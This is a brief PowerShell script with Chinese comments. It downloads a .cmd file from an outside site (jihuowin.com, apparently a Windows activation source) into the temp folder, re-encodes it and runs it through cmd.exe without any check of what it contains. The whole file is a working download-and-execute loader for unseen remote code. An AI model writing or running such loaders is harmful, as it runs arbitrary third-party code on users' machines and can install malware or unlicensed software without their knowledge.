# 定义下载的 URL 和保存的文件路径
$url = "https://jihuowin.com/plus/xpan.cmd"
$outputPath = "$Env:temp\2024.cmd"

try {
    # 下载文件
    Invoke-WebRequest -Uri $url -OutFile $outputPath

    # 将文件重新保存为 ANSI 编码
    $content = Get-Content -Path $outputPath -Raw
    $bytes = [System.Text.Encoding]::Default.GetBytes($content)
    [System.IO.File]::WriteAllBytes($outputPath, $bytes)

    # 执行下载的 CMD 文件
    Start-Process "cmd.exe" -ArgumentList "/c `"$outputPath`"" -Wait
    exit 1
} catch {
    exit 1
}

